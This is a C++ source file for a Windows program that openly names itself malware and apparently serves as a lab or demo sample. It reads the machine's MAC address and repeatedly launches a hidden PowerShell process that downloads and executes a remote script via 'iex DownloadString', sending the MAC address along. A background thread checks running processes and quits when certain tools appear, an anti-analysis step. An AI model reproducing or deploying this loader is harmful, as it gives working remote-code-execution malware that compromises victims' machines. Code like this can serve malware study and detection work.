#include "Header.h"
#include <stdio.h>
#pragma warning( disable : 4365 5045 5039)

#pragma warning( push )
#pragma warning( disable : 4820 4668 5039 4355 4625 4626 5026 5027 5204 5220)
#include <windows.h>
#include <Iphlpapi.h>
#include <WtsApi32.h>
#include <thread>
#include <future>
#pragma warning( pop )
#include <Psapi.h>
#include <iostream>



// Uses 'EnumProcesses', 'OpenProcess', and 'GetModuleBaseName' functions from 'Psapi' library.
bool GetProcessNamesByPsApi(vector<wstring>& running_processes) {

    DWORD processes[1024];
    DWORD cb_needed;

    // Enumerate all processes into processes argument
    if (!EnumProcesses(processes, sizeof(processes), &cb_needed)) {
        printf("Failed to enumerate processes. Error code: %lu", GetLastError());
        return false;
    }

    // Calculate the number of processes
    const DWORD process_count = cb_needed / sizeof(DWORD);

    for (DWORD i = 0; i < process_count; ++i) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
        if (hProcess == NULL) {
            continue;
        }

        wchar_t sz_process_name[MAX_PATH];
        if (GetModuleBaseNameW(hProcess, NULL, sz_process_name, sizeof(sz_process_name) / sizeof(wchar_t))) {
            wstring process_name(sz_process_name);
            running_processes.push_back(process_name);
        }

        CloseHandle(hProcess);
    }

    return true;
}


// Uses 'WTSEnumerateProcesses' function from 'WtsApi' library.
bool GetProcessNamesByWtsApi(vector<wstring>& running_processes) {

    WTS_PROCESS_INFO* pWPIs = NULL;
    DWORD dwProcCount = 0;

    if (!WTSEnumerateProcesses(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pWPIs, &dwProcCount))
    {
        return false;
    }

    //save all process names retrieved
    for (DWORD i = 0; i < dwProcCount; i++)
    {
        const wstring process_name(pWPIs[i].pProcessName);
        running_processes.push_back(process_name);
    }

    //Free memory
    if (pWPIs)
    {
        WTSFreeMemory(pWPIs);
        pWPIs = NULL;
    }

    return true;
}


bool IsAnyProcessRunning(const unordered_set<wstring>& target_processes, const vector<wstring>& running_processes)
{
    for (const wstring& tProcess : running_processes) {
        if (target_processes.count(tProcess)) {
            return true;
        }
    }

    return false;
}


bool RunMalware(const wstring web_address, const wstring mac_address) {
    wstring script = L"Add-Type -AssemblyName PresentationFramework\n"
        "iex ((New-Object System.Net.WebClient).DownloadString('" 
        + web_address + L"?macAddress=" + mac_address + L"'))";
    LPCWSTR psScript = script.c_str();
    bool result = false;

    HINSTANCE hInstance = ShellExecute(NULL, L"open", L"powershell.exe", psScript, NULL, SW_HIDE);
    if (reinterpret_cast<intptr_t>(hInstance) > 32) {
        // ShellExecute success
        result = true;
    }
    printf("ok");
    this_thread::sleep_for(chrono::seconds(7));
    return result;
}


DWORD WINAPI ProccessChecker(LPVOID lpParam) {
    if(lpParam) {}
    const unordered_set<wstring> target_processes{ L"VsDebugConsol1e.exe", L"slack.exe1" , L"OneDrive.exe1" };

    while (true)
    {
        vector<wstring> running_processes;
        if (!GetProcessNamesByWtsApi(running_processes)) {
            exit(EXIT_FAILURE);
        }

        if (IsAnyProcessRunning(target_processes, running_processes)) {
            exit(EXIT_FAILURE);
        }
    }
}

bool GetMacAddress(wstring& mac_address) {
    PIP_ADAPTER_INFO AdapterInfo;
    DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);

    AdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    if (AdapterInfo == NULL) {
        printf("Error allocating memory needed to call GetAdaptersinfo\n");
        return false;
    }

    // Make an initial call to GetAdaptersInfo to get the necessary size into the dwBufLen variable
    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(AdapterInfo);
        AdapterInfo = (IP_ADAPTER_INFO*)malloc(dwBufLen);
        if (AdapterInfo == NULL) {
            printf("Error allocating memory needed to call GetAdaptersinfo\n");
            return false;
        }
    }

    if (GetAdaptersInfo(AdapterInfo, &dwBufLen) != ERROR_SUCCESS) {
        free(AdapterInfo);
        printf("Error to get Adaptersinfo\n");
        return NULL;
    }
    // Contains pointer to current adapter info
    PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
    while (pAdapterInfo) {
        if (!(pAdapterInfo->Address[0] == 0x00 && pAdapterInfo->Address[1] == 0x00 &&
            pAdapterInfo->Address[2] == 0x00 && pAdapterInfo->Address[3] == 0x00 &&
            pAdapterInfo->Address[4] == 0x00 && pAdapterInfo->Address[5] == 0x00) &&
            !(pAdapterInfo->Address[0] == 0xFF && pAdapterInfo->Address[1] == 0xFF &&
                pAdapterInfo->Address[2] == 0xFF && pAdapterInfo->Address[3] == 0xFF &&
                pAdapterInfo->Address[4] == 0xFF && pAdapterInfo->Address[5] == 0xFF)) {
            // MAC address found

            WCHAR mac_addr[18];
            swprintf_s(mac_addr, L"%02X:%02X:%02X:%02X:%02X:%02X",
                pAdapterInfo->Address[0], pAdapterInfo->Address[1],
                pAdapterInfo->Address[2], pAdapterInfo->Address[3],
                pAdapterInfo->Address[4], pAdapterInfo->Address[5]);

            mac_address = wstring(mac_addr);
            free(AdapterInfo);
            return true;
        }

        pAdapterInfo = pAdapterInfo->Next;
    }

    free(AdapterInfo);
    return false; // caller must free.
}


#ifndef _TESTS
int main(void)
{
    // Runs process-checker in a separate treade, once it fails it exits the entire process.
    HANDLE hThread = CreateThread(NULL, 0, ProccessChecker, NULL, 0, NULL);
    if (NULL == hThread) {
        printf("Failed to create process-checker thread!");
        return 1;
    }
    
    // Every 5 minutes runs the malware
    wstring mac_address;
    wstring web_address = L"http://127.0.0.1:80/messageBox.ps1?";
    if (!GetMacAddress(mac_address)) {
        printf("Failed to get mac address!");
        return 1;
    }

    while (true)
    {
        if (!RunMalware(web_address, mac_address))
        {
            printf("Failed to run malware!");
        }
    }

    return 0;
}
#endif